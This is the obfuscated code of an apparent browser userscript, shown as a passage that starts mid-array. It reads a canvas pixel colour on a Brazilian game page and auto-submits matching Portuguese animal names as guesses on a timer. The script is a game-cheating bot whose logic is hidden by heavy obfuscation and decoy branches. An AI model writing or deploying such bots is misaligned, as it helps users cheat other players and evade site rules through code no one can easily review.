,'10pOuppH','255\x20255\x200\x20','XGypd','constructo','oyCqn','as-neves','tor','kuIyP','camaleão','pinks','WmyhE','Acertou!','reds','kDInv','IwlXs','3611586UTpOuh','andorinha','GwFYm','EZoVB','lEHKc','NaZmq','gXdwS','pantera','3|0|4|2|1','search','requestSub','oranges','Wfrde','gaivota','.br/0','black','wkAcb','HVZap','minhoca','23739000Fynxfd','0\x20140\x200\x2025','QiOGb','href','TQHCb','enguia','FQVGO','UrRfu','hEEEp','quero-quer','255\x200\x20147\x20','input','noYYS','brown','CGudT','torAll','0\x20255\x20255\x20','723900VognPP','querySelec','data','1879157ugrpLz','RKgiZ','uUFcH','eggFW','gwGGK','yellows','engala','yellow','blue','KkgjS','kkYJO','albatroz','getOwnProp','0\x200\x200\x20255','jMNPM','cyan','0\x200\x20255\x2025','tpbRc','apply','rebanho','CZoTf','bKxep'];_0x16ac=function(){return _0x585b1f;};return _0x16ac();}'use strict';var colour=-0x1*-0x9eb+-0x1*0x1dd1+-0x351*-0x6;let isBackground;var color=[_0x3e0e04(0x365,0x34f,0x320,0x32a),_0x3e0e04(0x3f6,0x3c6,0x3ba,0x3c3),_0x187195(-0x263,-0x2d7,-0x2a9,-0x298),_0x3e0e04(0x339,0x340,0x36f,0x31b),'orange','pink',_0x187195(-0x26c,-0x2bd,-0x299,-0x2cd),_0x3e0e04(0x393,0x34e,0x30b,0x31b),_0x3e0e04(0x382,0x373,0x3aa,0x34f)];function _0x3e0e04(_0x36a0d6,_0xaa0e68,_0xf25b65,_0x5a1dad){return _0x15c2(_0xaa0e68-0x257,_0xf25b65);}var _0x41e032={};_0x41e032[_0x187195(-0x2f1,-0x267,-0x2b0,-0x2fa)]=_0x187195(-0x26d,-0x2a6,-0x2a8,-0x264)+'5',_0x41e032['black']=_0x187195(-0x285,-0x2ec,-0x2ab,-0x2e0),_0x41e032['cyan']=_0x3e0e04(0x36c,0x343,0x318,0x34d)+_0x187195(-0x26c,-0x25d,-0x28f,-0x282),_0x41e032[_0x3e0e04(0x388,0x340,0x333,0x37b)]=_0x187195(-0x2a8,-0x2be,-0x279,-0x27e)+'55',_0x41e032['orange']=_0x3e0e04(0x3bf,0x397,0x3dd,0x3d5)+_0x3e0e04(0x354,0x370,0x377,0x39a),_0x41e032[_0x187195(-0x25f,-0x264,-0x261,-0x244)]=_0x187195(-0x2f9,-0x30c,-0x2c2,-0x2eb)+_0x3e0e04(0x34d,0x370,0x344,0x395),_0x41e032[_0x187195(-0x26d,-0x288,-0x299,-0x24f)]='0\x20140\x200\x2025'+'5',_0x41e032[_0x3e0e04(0x364,0x34e,0x314,0x380)]=_0x3e0e04(0x3f2,0x3a9,0x3f5,0x38c)+_0x187195(-0x28a,-0x258,-0x28f,-0x291),_0x41e032[_0x3e0e04(0x348,0x373,0x369,0x369)]=_0x187195(-0x298,-0x2ae,-0x27d,-0x274)+'5';var background=_0x41e032,_0x2489c3={};function _0x15c2(_0x15c252,_0x5bb442){var _0x87adc7=_0x16ac();return _0x15c2=function(_0x3557ca,_0x450baa){_0x3557ca=_0x3557ca-(-0x6f3+-0x17b*-0x5+0x6c);var _0x3610b3=_0x87adc7[_0x3557ca];return _0x3610b3;},_0x15c2(_0x15c252,_0x5bb442);}_0x2489c3['blues']=['corais','arraia',_0x3e0e04(0x2f0,0x338,0x35b,0x333)],_0x2489c3['blacks']=[_0x3e0e04(0x37b,0x38e,0x370,0x348),_0x187195(-0x246,-0x248,-0x27e,-0x2c4),'vaga-lume','cordeiro',_0x3e0e04(0x385,0x35a,0x38d,0x352)],_0x2489c3[_0x187195(-0x2a8,-0x2a0,-0x278,-0x27c)]=[_0x3e0e04(0x3e7,0x3c4,0x3ea,0x39c),_0x3e0e04(0x37d,0x3b8,0x402,0x3f8),_0x187195(-0x2f6,-0x2f6,-0x2ad,-0x29a)],_0x2489c3['browns']=[_0x187195(-0x22f,-0x1f4,-0x236,-0x200)],_0x2489c3[_0x3e0e04(0x3a0,0x3c2,0x3d5,0x391)]=['tigre',_0x187195(-0x29c,-0x288,-0x26d,-0x265)+_0x3e0e04(0x32f,0x34d,0x371,0x345)],_0x2489c3[_0x3e0e04(0x3c4,0x3b1,0x368,0x3d9)]=[_0x187195(-0x256,-0x243,-0x241,-0x24e)],_0x2489c3[_0x187195(-0x277,-0x225,-0x25f,-0x28f)]=[_0x187195(-0x2ed,-0x2b1,-0x2c3,-0x2f3)+'o'],_0x2489c3['yellows']=['onça','leopardo',_0x187195(-0x22d,-0x2a9,-0x26f,-0x267),_0x3e0e04(0x3d8,0x39c,0x354,0x395)+'a',_0x187195(-0x29c,-0x282,-0x27b,-0x2b5)+_0x187195(-0x263,-0x298,-0x252,-0x289)],_0x2489c3['reds']=[_0x187195(-0x269,-0x206,-0x24f,-0x252)];var anis=_0x2489c3;let list;var vermelho=0x2*-0x9a7+-0x1e92+0xe4*0x38,verde=-0x226e+0x8*-0x1ca+-0x30be*-0x1,azul=0x6a4+0x1*0x261b+-0x2cbf,alpha=0x205b+-0x656+-0x1a05*0x1;setInterval(()=>{function _0x5ce7e3(_0xf853d,_0xdfa921,_0xd1d737,_0x3eb4aa){return _0x3e0e04(_0xf853d-0xe8,_0xf853d- -0x8c,_0x3eb4aa,_0x3eb4aa-0x10c);}var _0x4c28ea={};_0x4c28ea['eWhQo']=_0x5ce7e3(0x2ef,0x324,0x30f,0x2cf),_0x4c28ea['tpbRc']=_0x6ee854(0x22c,0x1f9,0x21e,0x23c),_0x4c28ea[_0x6ee854(0x21a,0x206,0x251,0x253)]=function(_0x2f43a0,_0x1b5a4c){return _0x2f43a0==_0x1b5a4c;},_0x4c28ea[_0x6ee854(0x279,0x21a,0x22d,0x23d)]=_0x6ee854(0x25f,0x2c2,0x284,0x297),_0x4c28ea[_0x6ee854(0x231,0x265,0x278,0x27c)]=function(_0x4988a1,_0x1cf46a){return _0x4988a1>_0x1cf46a;};function _0x6ee854(_0x1119c5,_0x32f339,_0x3640a6,_0x5d8850){return _0x187195(_0x1119c5-0x100,_0x32f339,_0x3640a6-0x4e4,_0x5d8850-0x88);}_0x4c28ea[_0x6ee854(0x2b6,0x26a,0x286,0x23d)]='blue',_0x4c28ea[_0x6ee854(0x22a,0x1e7,0x22f,0x21a)]=_0x6ee854(0x27a,0x281,0x2ab,0x2d5),_0x4c28ea[_0x6ee854(0x27e,0x251,0x24f,0x27d)]='brown',_0x4c28ea['bsYQm']=_0x6ee854(0x293,0x286,0x283,0x268),_0x4c28ea['Kpgdm']=_0x5ce7e3(0x2da,0x2d5,0x2cd,0x2c9),_0x4c28ea[_0x5ce7e3(0x2d6,0x2c0,0x2e2,0x312)]='yellow',_0x4c28ea[_0x5ce7e3(0x337,0x37b,0x34f,0x2f5)]=_0x5ce7e3(0x2e7,0x2fb,0x308,0x2cb);var _0x5dc103=_0x4c28ea;if(document[_0x5ce7e3(0x2d8,0x2ca,0x30c,0x2cc)][_0x5ce7e3(0x341,0x359,0x384,0x366)]['includes'](_0x6ee854(0x29c,0x236,0x26a,0x23a)+_0x6ee854(0x2b2,0x289,0x2aa,0x2d9))){if(_0x5dc103[_0x5ce7e3(0x2fe,0x301,0x310,0x344)]!==_0x5dc103[_0x6ee854(0x281,0x27c,0x23d,0x288)]){var _0x3afa07=document['querySelec'+_0x5ce7e3(0x322,0x353,0x316,0x317)]('canvas'),_0x2bab66=_0x3afa07['getContext']('2d'),_0x5927b1=_0x2bab66[_0x5ce7e3(0x2fd,0x2fe,0x2be,0x327)+'ta'](0xa3b*-0x1+0x1ea2+0x1467*-0x1,0x146d*-0x1+0x2653+0x4f*-0x3a,_0x3afa07[_0x6ee854(0x266,0x27a,0x28b,0x2c0)],_0x3afa07[_0x5ce7e3(0x30e,0x2ca,0x331,0x2c6)]);vermelho=_0x5927b1[_0x5ce7e3(0x2ba,0x2f3,0x2c3,0x298)][0x13*0x101+-0x4a2*0x1+-0xe71],verde=_0x5927b1[_0x5ce7e3(0x2ba,0x296,0x2f6,0x2fc)][-0x10b*0xf+-0x10*0x17b+0x3ef*0xa],azul=_0x5927b1[_0x6ee854(0x236,0x210,0x22b,0x21a)][-0x1670+0x3b*-0x4f+0x3*0xd8d],alpha=_0x5927b1[_0x5ce7e3(0x2ba,0x26e,0x2cf,0x2da)][-0x941*0x1+0x1b00+0x2*-0x8de];const _0x37ab01=vermelho+'\x20'+verde+'\x20'+azul+'\x20'+alpha;if(_0x5dc103[_0x5ce7e3(0x2e0,0x2cb,0x2e3,0x2f1)](_0x37ab01,background[color[colour]])){if(_0x5ce7e3(0x313,0x311,0x312,0x310)===_0x5dc103['RKgiZ'])isBackground=Object[_0x6ee854(0x253,0x276,0x238,0x275)+'ertyNames'](background)[colour];else{var _0x7c0fb=_0x450b64[_0x6ee854(0x284,0x220,0x23e,0x256)](_0x757fd4,arguments);return _0x1bd20a=null,_0x7c0fb;}}colour++;_0x5dc103[_0x6ee854(0x290,0x22d,0x278,0x22e)](colour,color[_0x6ee854(0x2ad,0x2b3,0x28c,0x286)])&&(colour=-0x9ee+-0x389*-0x2+0x2dc);switch(isBackground){case _0x5dc103[_0x6ee854(0x28d,0x2bf,0x286,0x287)]:list=anis['blues'];break;case _0x5dc103[_0x5ce7e3(0x2be,0x2d8,0x29b,0x2d8)]:list=anis['blacks'];break;case'cyan':list=anis[_0x6ee854(0x2a7,0x2a6,0x26c,0x263)];break;case _0x5dc103[_0x6ee854(0x278,0x252,0x24f,0x264)]:list=anis[_0x5ce7e3(0x2ff,0x345,0x2c2,0x2e1)];break;case'orange':list=anis['oranges'];break;case _0x5dc103[_0x6ee854(0x22a,0x264,0x259,0x234)]:list=anis[_0x6ee854(0x261,0x278,0x296,0x273)];break;case _0x5dc103[_0x6ee854(0x29c,0x249,0x27b,0x28e)]:list=anis[_0x6ee854(0x287,0x279,0x285,0x299)];break;case _0x5dc103['Zzywj']:list=anis[_0x6ee854(0x1ee,0x213,0x231,0x262)];break;case _0x5dc103[_0x6ee854(0x25e,0x2a0,0x2a8,0x2e5)]:list=anis[_0x5ce7e3(0x328,0x2e5,0x365,0x313)];}}else _0x1be8e3=null;}},-0x1cd*0x11+0x2119*-0x1+0x401a);var lie=-0x1b78+-0x1b0a+0x3683;function _0x187195(_0x1de804,_0x1cfaa0,_0x14bfd2,_0x4f023c){return _0x15c2(_0x14bfd2- -0x3a8,_0x1cfaa0);}var resp;const de=0x48ba+-0x1e*-0xe6+-0x3c9e;let le=0x1*-0x21de+-0x1a71+-0x1*-0x3c4f;function lista(){var _0x470d4a={'MLmZO':function(_0x59f2cb,_0x585571){return _0x59f2cb!=_0x585571;},'HnUOo':function(_0x580ee8,_0x17fbc5){return _0x580ee8==_0x17fbc5;},'JZIti':function(_0x2a9ac8,_0x21a3f1){return _0x2a9ac8(_0x21a3f1);},'dSMHk':function(_0x304935,_0x164604){return _0x304935===_0x164604;},'IbJSC':_0x3ab574(-0xa0,-0x93,-0xde,-0x68),'wkAcb':_0x4deee7(-0x16c,-0x17c,-0x14d,-0x144),'kuAgz':_0x4deee7(-0x16e,-0x157,-0x136,-0x11d),'hGhnk':function(_0x382137,_0x309d3d){return _0x382137!==_0x309d3d;},'petKE':'ahzAV','TqlZQ':'input','radHc':function(_0x32fc8b,_0xee3d85){return _0x32fc8b>=_0xee3d85;},'UrRfu':function(_0xc4b08a,_0x322a43){return _0xc4b08a<_0x322a43;},'NwvWD':function(_0x4e0b0b,_0x139d36){return _0x4e0b0b+_0x139d36;},'jwTHc':function(_0x15a8a4,_0x274973){return _0x15a8a4!==_0x274973;},'jMNPM':_0x4deee7(-0x14a,-0x11f,-0x13f,-0x13e),'PTach':_0x4deee7(-0x169,-0xf3,-0x13e,-0xf7),'zsGOk':function(_0x431dce,_0x5607a2){return _0x431dce!=_0x5607a2;},'QiOGb':_0x4deee7(-0x16d,-0x120,-0x145,-0x126),'ceDKq':function(_0x38f014,_0x45a82c,_0xa9a42e){return _0x38f014(_0x45a82c,_0xa9a42e);}};function _0x3ab574(_0x39fef7,_0x3ab12e,_0x8660c0,_0x20ab25){return _0x3e0e04(_0x39fef7-0x1e4,_0x39fef7- -0x445,_0x8660c0,_0x20ab25-0x1a0);}function _0x4deee7(_0x22c0ed,_0x366d69,_0x5481d4,_0x3a47aa){return _0x187195(_0x22c0ed-0x110,_0x3a47aa,_0x5481d4-0x153,_0x3a47aa-0x1dc);}if(_0x470d4a[_0x4deee7(-0x169,-0x12a,-0x172,-0x19b)](_0x470d4a[_0x4deee7(-0x145,-0xfb,-0x118,-0x140)](le,de),Date['now']())){if(_0x470d4a[_0x4deee7(-0x157,-0xfe,-0x11b,-0xff)](_0x470d4a[_0x4deee7(-0x111,-0x15c,-0x157,-0x129)],_0x470d4a[_0x3ab574(-0xc6,-0xfa,-0xbb,-0xb6)])){lie=0x49*-0x3b+-0xe71*-0x1+0x263;if(_0x470d4a['zsGOk'](list[-0xe9e+0x236*0x7+-0xdc],undefined)){_0x470d4a[_0x4deee7(-0x124,-0x168,-0x149,-0x132)](document[_0x3ab574(-0xc7,-0xfc,-0xd8,-0xcf)+'sByClassNa'+'me'](_0x470d4a['kuAgz'])[0x1d37+-0x3df*-0x2+-0x24f5]['checked'],!![])&&(document[_0x4deee7(-0x135,-0x198,-0x167,-0x142)+'torAll'](_0x470d4a[_0x3ab574(-0xbd,-0xd8,-0xe2,-0xeb)])[-0x1843+-0xb*0x1f6+-0x1*-0x2ddc][_0x4deee7(-0x14c,-0x105,-0x14c,-0x167)]=list[-0x231b+0xbc9+0x1*0x1752],document['querySelec'+_0x3ab574(-0x103,-0x123,-0xb9,-0xc1)](_0x470d4a[_0x4deee7(-0xa8,-0xe5,-0xe0,-0xcd)])[0x1*0x3f3+0xad*-0x6+0x1b]['requestSub'+_0x3ab574(-0xce,-0xd8,-0xa1,-0x94)]());var _0x3d8ee0=_0x470d4a[_0x4deee7(-0xc4,-0x12d,-0x108,-0x13d)](setInterval,()=>{var _0x3f6790={'GbUKL':function(_0x26f4bc,_0x5a278e){function _0x3ff9d9(_0xd307ff,_0x7dc10e,_0x50b085,_0x1353be){return _0x15c2(_0x1353be- -0x5,_0x50b085);}return _0x470d4a[_0x3ff9d9(0x141,0x155,0xe1,0x121)](_0x26f4bc,_0x5a278e);},'wYMEc':function(_0x2ebdc6,_0x16e7f6){function _0x14e59f(_0x5cfe1a,_0x5d32e4,_0x230e8c,_0x52aa29){return _0x15c2(_0x5d32e4- -0x1b6,_0x52aa29);}return _0x470d4a[_0x14e59f(-0x7f,-0xaa,-0x94,-0xd2)](_0x2ebdc6,_0x16e7f6);},'fcUIp':_0x34c1ae(0x147,0x132,0x159,0x131),'KoNOL':_0x34c1ae(0x166,0x17c,0x14a,0x106),'oyCqn':_0x34c1ae(0x165,0x1d0,0x1a2,0x1cd),'ddmiY':function(_0x435038,_0x1fea64){function _0x36f073(_0x505bd5,_0x607cbe,_0x2eb119,_0x25d847){return _0x30910b(_0x505bd5-0xc1,_0x505bd5-0x318,_0x607cbe,_0x25d847-0x110);}return _0x470d4a[_0x36f073(0x42a,0x43b,0x437,0x408)](_0x435038,_0x1fea64);}};function _0x30910b(_0x2c6e58,_0x409ffb,_0x2dfb44,_0x3bc99d){return _0x3ab574(_0x409ffb-0x1e2,_0x409ffb-0x97,_0x2dfb44,_0x3bc99d-0x17a);}function _0x34c1ae(_0x34d269,_0x4037b4,_0x104620,_0x496b47){return _0x3ab574(_0x104620-0x228,_0x4037b4-0x12a,_0x496b47,_0x496b47-0xd8);}if(_0x470d4a[_0x30910b(0xc4,0x105,0xbd,0x133)](_0x470d4a['IbJSC'],_0x470d4a[_0x34c1ae(0x1c3,0x1f6,0x1aa,0x195)])){_0x3f6790['GbUKL'](_0x5caa77[_0x14cc4c],_0x43fc59)&&(_0x3f6790[_0x34c1ae(0x145,0x165,0x178,0x15d)](_0xa3958d[_0x30910b(0x12d,0x11b,0x138,0x12d)+_0x30910b(0x144,0x140,0x15b,0x14c)+'me'](_0x3f6790[_0x34c1ae(0x167,0x157,0x15c,0x152)])[-0x284+-0x24fc+-0x2780*-0x1][_0x34c1ae(0x121,0x15a,0x144,0x18f)],!![])&&(_0x1a7b77['querySelec'+_0x34c1ae(0x116,0x108,0x125,0xdc)](_0x30910b(0xa8,0xdb,0xdd,0xce))[-0xed4+0x262d+-0x1752]['value']=_0x188aae[_0x5b2b75],_0x1f9f9b['querySelec'+_0x34c1ae(0xfb,0x14d,0x125,0x103)](_0x3f6790['KoNOL'])[0x512+0x14*0x142+0x2*-0xf1d][_0x34c1ae(0x1ca,0x1c0,0x1a4,0x1ed)+_0x34c1ae(0x13f,0x142,0x15a,0x151)]()));_0x3bc12f++;if(_0x4abc28>=_0x38aaf1['length']){var _0x35de2f=_0x3f6790[_0x34c1ae(0x1d1,0x1b3,0x18f,0x165)][_0x30910b(0x151,0x10f,0xfc,0x14c)]('|'),_0x4f0d67=0x4bd*-0x6+0x1*-0x1749+0x3*0x113d;while(!![]){switch(_0x35de2f[_0x4f0d67++]){case'0':_0x593f7d=[];continue;case'1':_0x4a4337=null;continue;case'2':_0x2d028a=0x857+0x23ff+-0x3*0xec7;continue;case'3':_0x3f6790[_0x34c1ae(0x18a,0x178,0x170,0x1a4)](_0x3d34bf,_0x2f0285);continue;case'4':_0x40826b=null;continue;}break;}}}else{if(list[lie]!=undefined){if(_0x470d4a[_0x34c1ae(0x17b,0x176,0x146,0x190)](document['getElement'+_0x34c1ae(0x176,0x1ac,0x186,0x17f)+'me'](_0x470d4a[_0x34c1ae(0x16c,0x14e,0x140,0x166)])[0x38d+0x11ea+-0x5*0x44b][_0x34c1ae(0x127,0x123,0x144,0x134)],!![])){if(_0x470d4a[_0x30910b(0x11d,0x108,0x106,0xd8)](_0x470d4a[_0x30910b(0x114,0x106,0x12f,0x118)],_0x470d4a['petKE'])){if(_0x61eb7d){var _0x5772b5=_0x5599f7[_0x34c1ae(0x142,0x16a,0x13c,0x128)](_0x4fa832,arguments);return _0x487ce4=null,_0x5772b5;}}else document[_0x30910b(0xb1,0xe2,0xad,0xf6)+_0x30910b(0xc0,0xdf,0xab,0x113)](_0x470d4a[_0x34c1ae(0x16a,0x174,0x16b,0x17f)])[-0x66*-0x29+0x43*-0x63+0x2*0x4cd]['value']=list[lie],document['querySelec'+_0x30910b(0xde,0xdf,0xdd,0xf4)](_0x30910b(0x145,0x104,0x109,0xfa))[0x287*-0xf+-0xe9f+0x3488][_0x34c1ae(0x19f,0x16d,0x1a4,0x183)+_0x34c1ae(0x12c,0x191,0x15a,0x121)]();}}lie++;if(_0x470d4a[_0x34c1ae(0x14c,0x191,0x17b,0x1bb)](lie,list[_0x30910b(0x106,0x144,0x179,0x133)])){var _0x2853e5='0|4|2|3|1'[_0x30910b(0xd4,0x10f,0x128,0x133)]('|'),_0x406ee5=-0x22c7+-0x1460+0x3727;while(!![]){switch(_0x2853e5[_0x406ee5++]){case'0':_0x470d4a[_0x34c1ae(0x12b,0x112,0x158,0x177)](clearInterval,_0x3d8ee0);continue;case'1':resp=null;continue;case'2':isBackground=null;continue;case'3':lie=0x182+-0x2*0x9ad+0x11d9;continue;case'4':list=[];continue;}break;}}}},0x7e2*-0x4+-0x99b*0x1+0x2d0b);}le=Date[_0x4deee7(-0xe7,-0x14a,-0x111,-0xfa)]();}else _0x4cf15c();}}setInterval(()=>{var _0x1dd81f={};_0x1dd81f[_0x2ea50a(0x413,0x41d,0x43d,0x41f)]=function(_0x362333,_0x3717f2){return _0x362333==_0x3717f2;};function _0x2ea50a(_0x326735,_0x5d4988,_0x5b83b8,_0x5a561f){return _0x187195(_0x326735-0x80,_0x5a561f,_0x326735-0x6d7,_0x5a561f-0x91);}function _0xdea4f1(_0x247952,_0x45f38d,_0x538586,_0x2bf438){return _0x3e0e04(_0x247952-0x2,_0x2bf438- -0x507,_0x45f38d,_0x2bf438-0x10c);}_0x1dd81f[_0xdea4f1(-0x124,-0x117,-0x143,-0x14b)]=_0x2ea50a(0x416,0x41d,0x427,0x457),_0x1dd81f[_0x2ea50a(0x419,0x463,0x434,0x45e)]='Intervalo';var _0x18e2d0=_0x1dd81f;_0x18e2d0['hEEEp'](document[_0x2ea50a(0x41d,0x420,0x426,0x3d9)+_0xdea4f1(-0x1cb,-0x1e3,-0x182,-0x1c5)](_0x18e2d0['NaZmq'])[-0x115*-0xa+-0xf67*-0x1+-0x1a32]['value'],_0x18e2d0[_0xdea4f1(-0x1a5,-0x1a5,-0x1e3,-0x1c6)])&&(list=null);},-0x1*0x127+0xda5+0x70a),setInterval(()=>{function _0x2de447(_0x505a75,_0x11a473,_0x2b1366,_0x118f31){return _0x187195(_0x505a75-0x34,_0x505a75,_0x2b1366-0x30a,_0x118f31-0xbf);}function _0x29e299(_0x5a0ab3,_0x3b73f5,_0x4aad06,_0x5e4a89){return _0x3e0e04(_0x5a0ab3-0x11,_0x4aad06- -0x14d,_0x3b73f5,_0x5e4a89-0x1f0);}var _0x188bb5={'Smuif':function(_0xd39b66,_0x436d30){return _0xd39b66!=_0x436d30;},'isGSg':'input','ZCKzo':_0x2de447(0x3b,0x2b,0x62,0x20)+'5','eMiHI':'0\x20255\x20255\x20'+_0x29e299(0x204,0x23c,0x223,0x22c),'WmyhE':_0x2de447(0x4f,0x7f,0x91,0x57)+'55','SFqjY':_0x29e299(0x220,0x285,0x24a,0x28c)+_0x29e299(0x257,0x1f1,0x223,0x20f),'kDInv':_0x29e299(0x256,0x283,0x25c,0x26c)+_0x29e299(0x267,0x229,0x223,0x1e7),'lEHKc':_0x29e299(0x24c,0x279,0x235,0x1ef)+'5','GwFYm':function(_0x1441ca){return _0x1441ca();},'XGypd':function(_0x173513,_0x79fc61){return _0x173513==_0x79fc61;},'Jqemt':'Intervalo','uPEyW':_0x2de447(0x91,0xb2,0xbe,0x7a),'CZoTf':function(_0x10e941,_0x121747){return _0x10e941!==_0x121747;},'bKxep':_0x2de447(0xea,0xe0,0xad,0xbf),'IwlXs':_0x2de447(0xb0,0xe8,0xba,0x95),'wvGLb':_0x29e299(0x1a4,0x231,0x1f0,0x1d7)+_0x2de447(0x4c,0xb3,0x7b,0x80),'XUEpo':'0\x20140\x200\x2025'+'5','dSxTS':function(_0x4cb179,_0x1ae7c0){return _0x4cb179!==_0x1ae7c0;},'noYYS':_0x2de447(0x17,0x2c,0x56,0x85),'TJlvQ':function(_0x39a4c5,_0x5e9c37){return _0x39a4c5==_0x5e9c37;},'TQHCb':_0x29e299(0x225,0x259,0x22f,0x1fa)};if(document[_0x29e299(0x213,0x223,0x1f8,0x1b0)+_0x29e299(0x210,0x221,0x1f5,0x1ef)](_0x188bb5[_0x29e299(0x25f,0x203,0x23f,0x28a)])[-0x22f3*-0x1+-0x560+-0x1*0x1d8c][_0x29e299(0x218,0x226,0x213,0x1f8)]!=_0x188bb5[_0x2de447(0x9c,0xab,0x85,0x9a)]){if(_0x188bb5[_0x29e299(0x1e0,0x234,0x20e,0x225)](_0x188bb5[_0x29e299(0x241,0x1d7,0x20f,0x206)],_0x188bb5[_0x29e299(0x29f,0x247,0x269,0x247)])){let _0x533582=['0\x200\x20255\x2025'+'5',_0x2de447(0x76,0x2e,0x5f,0x1e),_0x188bb5[_0x2de447(0xb4,0x40,0x7c,0x60)],_0x188bb5['WmyhE'],_0x188bb5[_0x2de447(0x5c,0xb7,0x70,0x91)],_0x188bb5[_0x29e299(0x231,0x247,0x22b,0x235)],_0x188bb5['XUEpo'],_0x188bb5[_0x2de447(0xbb,0x9c,0xc0,0xaa)],_0x188bb5[_0x29e299(0x250,0x2af,0x26e,0x22f)]];for(let _0x4c3d95 of _0x533582){if(_0x188bb5['dSxTS'](_0x188bb5[_0x2de447(0x33,0xf,0x4a,0x48)],_0x2de447(0x77,0xa1,0x56,0x30))){if(_0x188bb5['Smuif'](_0x395187[_0x2de447(0x5b,0x6b,0x50,0x60)+'torAll'](_0x188bb5['isGSg'])[-0x1bd9*0x1+-0x10d1+0x2cb1][_0x2de447(0xa8,0x6c,0x6b,0xa8)],_0x29e299(0x259,0x278,0x266,0x251))){let _0x271681=[_0x188bb5[_0x2de447(0x49,0x66,0x8b,0x5e)],_0x2de447(0x28,0x53,0x5f,0x31),_0x188bb5[_0x2de447(0x4c,0x7f,0x7c,0x5e)],_0x188bb5[_0x2de447(0xe9,0x102,0xbd,0x7d)],_0x188bb5[_0x29e299(0x1e4,0x1f6,0x218,0x1f7)],_0x2de447(-0x1,0x43,0x48,0x6e)+'255',_0x29e299(0x280,0x282,0x27e,0x25b)+'5',_0x188bb5[_0x2de447(0xf8,0xfd,0xc0,0x81)],_0x188bb5[_0x29e299(0x274,0x2b6,0x26e,0x2a4)]];for(let _0x4bd0c7 of _0x271681){_0x15e5dc+'\x20'+_0x209996+'\x20'+_0x3e3edc+'\x20'+_0xad397b==_0x4bd0c7&&_0x188bb5[_0x2de447(0xf5,0xd6,0xc4,0x7d)](_0x4ddda4);}}}else{if(_0x188bb5[_0x2de447(0x68,0x45,0x7a,0xab)](vermelho+'\x20'+verde+'\x20'+azul+'\x20'+alpha,_0x4c3d95)){if(_0x188bb5['dSxTS'](_0x188bb5[_0x2de447(0x1e,0x49,0x42,0x50)],_0x188bb5[_0x29e299(0x215,0x231,0x1ea,0x22e)])){var _0x51b94f=_0xb92fb9?function(){function _0x21a3e4(_0x18e0a2,_0x45a88b,_0x2209f3,_0x41ceea){return _0x2de447(_0x45a88b,_0x45a88b-0x1c4,_0x2209f3-0x21a,_0x41ceea-0x3e);}if(_0x2fc849){var _0x346324=_0x6dcc57[_0x21a3e4(0x27b,0x286,0x27e,0x2b9)](_0x225cf,arguments);return _0x21e20b=null,_0x346324;}}:function(){};return _0x344c83=![],_0x51b94f;}else lista();}}}}else _0x188bb5[_0x2de447(0x71,0x8d,0xb5,0x9d)](_0x3090ba[_0x2de447(0x5c,0x1c,0x50,0x8)+'torAll'](_0x188bb5[_0x29e299(0x218,0x211,0x23f,0x1f4)])[0xb*0x15b+0x841*0x2+-0x1f64][_0x29e299(0x20f,0x228,0x213,0x248)],_0x188bb5[_0x29e299(0x269,0x26a,0x24c,0x251)])&&(_0x56b4ac=null);}},0x51b+-0x23a0+0x1e8f);
